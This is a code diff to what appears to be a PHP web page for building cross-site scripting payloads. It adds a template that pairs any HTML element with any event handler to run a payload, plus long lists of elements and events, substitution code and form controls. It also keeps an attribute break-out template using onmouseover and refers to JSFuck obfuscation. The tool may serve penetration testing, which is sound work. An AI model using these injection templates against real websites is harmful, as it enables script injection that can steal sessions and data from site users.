@@ -197,9 +197,194 @@
     ],
     [
       "name" => "Element onmouseover",
-      "desc"  => "Break out of an element attribute and add an onmouseover event",
+      "desc" => "Break out of an element attribute and add an onmouseover event",
       "code" => "'\" onmouseover={payload} >"
+    ],
+    [
+      "name" => "Custom element and event",
+      "desc" => "Define an element and an event to execute the payload",
+      "code" => "<{element}/{event}={payload} />",
+      "fields" => "element,event"
     ]
+  ];
+
+  $aElements = [
+    "a",
+    "abbr",
+    "acronym",
+    "address",
+    "applet",
+    "area",
+    "article",
+    "aside",
+    "audio",
+    "b",
+    "base",
+    "basefont",
+    "bdi",
+    "bdo",
+    "big",
+    "blockquote",
+    "body",
+    "br",
+    "button",
+    "canvas",
+    "caption",
+    "center",
+    "cite",
+    "code",
+    "col",
+    "colgroup",
+    "data",
+    "datalist",
+    "dd",
+    "del",
+    "details",
+    "dfn",
+    "dialog",
+    "dir",
+    "div",
+    "dl",
+    "dt",
+    "em",
+    "embed",
+    "fieldset",
+    "figcaption",
+    "figure",
+    "font",
+    "footer",
+    "form",
+    "frame",
+    "frameset",
+    "h1 to h6",
+    "head",
+    "header",
+    "hr",
+    "html",
+    "i",
+    "iframe",
+    "img",
+    "input",
+    "ins",
+    "kbd",
+    "label",
+    "legend",
+    "li",
+    "link",
+    "main",
+    "map",
+    "mark",
+    "meta",
+    "meter",
+    "nav",
+    "noframes",
+    "noscript",
+    "object",
+    "ol",
+    "optgroup",
+    "option",
+    "output",
+    "p",
+    "param",
+    "picture",
+    "pre",
+    "progress",
+    "q",
+    "rp",
+    "rt",
+    "ruby",
+    "s",
+    "samp",
+    "script",
+    "section",
+    "select",
+    "small",
+    "source",
+    "span",
+    "strike",
+    "strong",
+    "style",
+    "sub",
+    "summary",
+    "sup",
+    "svg",
+    "table",
+    "tbody",
+    "td",
+    "template",
+    "textarea",
+    "tfoot",
+    "th",
+    "thead",
+    "time",
+    "title",
+    "tr",
+    "track",
+    "tt",
+    "u",
+    "ul",
+    "var",
+    "video",
+    "wbr"
+  ];
+
+  $aEvents = [
+    "onabort",
+    "oncancel",
+    "onblur",
+    "oncanplay",
+    "oncanplaythrough",
+    "onchange",
+    "onclick",
+    "oncontextmenu",
+    "ondblclick",
+    "ondrag",
+    "ondragend",
+    "ondragenter",
+    "ondragexit",
+    "ondragleave",
+    "ondragover",
+    "ondragstart",
+    "ondrop",
+    "ondurationchange",
+    "onemptied",
+    "onended",
+    "onerror",
+    "onfocus",
+    "onformchange",
+    "onforminput",
+    "oninput",
+    "oninvalid",
+    "onkeydown",
+    "onkeypress",
+    "onkeyup",
+    "onload",
+    "onloadeddata",
+    "onloadedmetadata",
+    "onloadstart",
+    "onmousedown",
+    "onmousemove",
+    "onmouseout",
+    "onmouseover",
+    "onmouseup",
+    "onmousewheel",
+    "onpause",
+    "onplay",
+    "onplaying",
+    "onprogress",
+    "onratechange",
+    "onreadystatechange",
+    "onscroll",
+    "onseeked",
+    "onseeking",
+    "onselect",
+    "onshow",
+    "onstalled",
+    "onsubmit",
+    "onsuspend",
+    "ontimeupdate",
+    "onvolumechange",
+    "onwaiting"
   ];
   
   // JSFuck: http://www.jsfuck.com/
@@ -587,7 +772,6 @@
     $payload = $aPayloads[$form['payloadid']];
     $rtn['meta']['payload'] = $payload;
 
-
     // Replace values in code with form values
     $fields = explode( ",", $payload["fields"] );
     $code = $payload['code'];
@@ -638,6 +822,17 @@
     $injection = $aInjections[$form['injectionid']];
     $rtn['meta']['injection'] = $injection;
     $code = str_replace( '{payload}', $code, $injection['code'] );
+   
+    // Custom injection
+    if( array_key_exists( 'fields', $injection ) ){
+      $fields = explode( ",", $injection["fields"] );
+      
+      foreach( $fields as $f ){
+        if( !in_array( $f, array_keys( $form ) ) ) continue;
+        $code = str_replace( '{'.$f.'}', $form[$f], $code );
+      }
+    }
+    $rtn['payload'] = $code;
     $rtn['inject'] = $code;
     return $rtn;
   }
@@ -682,9 +877,27 @@ function createPayload(){
       echo "      else opts['$f'] = f.value;\n";
       echo "      e = document.getElementById('".$f."_container');\n";
       echo "      e.style.display = 'block';\n";
-      echo "      console.log('show', e);\n";
     }
     echo "      break;\n";
+  }
+?>
+  }
+  switch( opts['injectionid'] ){
+<?php
+  foreach( $aInjections as $id => $inj ){
+    if( array_key_exists( 'fields', $inj ) ){
+      echo "    case '$id':\n";
+      $fields = explode( ',', $inj['fields'] );
+      foreach( $fields as $f ){
+        echo "      f = document.getElementById('$f')\n";
+        echo "      if( f.tagName == 'SELECT' ) opts['$f'] = f.options[f.selectedIndex].value;\n";
+        echo "      else opts['$f'] = f.value;\n";
+        echo "      e = document.getElementById('".$f."_container');\n";
+        echo "      e.style.display = 'block';\n";
+        echo "      console.log('show', e);\n";
+      }
+      echo "      break;\n";
+    }
   }
 ?>
   }
@@ -816,6 +1029,28 @@ window.onload = initForm;
 ?>
     </select>
     <div id="injection_desc" class="desc"></div>
+  </div>
+  <div class="container" id="element_container">
+    <label for="element">HTML Element</label>
+    <select id="element">
+<?php
+  foreach( $aElements as $el ){
+    echo "      <option value=\"$el\">" . $el. "</option>\n";
+  }
+?>
+    </select>
+    <div id="element_desc" class="desc"></div>
+  </div>
+  <div class="container" id="event_container">
+    <label for="event">HTML Event</label>
+    <select id="event">
+<?php
+  foreach( $aEvents as $ev ){
+    echo "      <option value=\"$ev\">" . $ev . "</option>\n";
+  }
+?>
+    </select>
+    <div id="event_desc" class="desc"></div>
   </div>
   <div>
     <label for="output">Output</label>
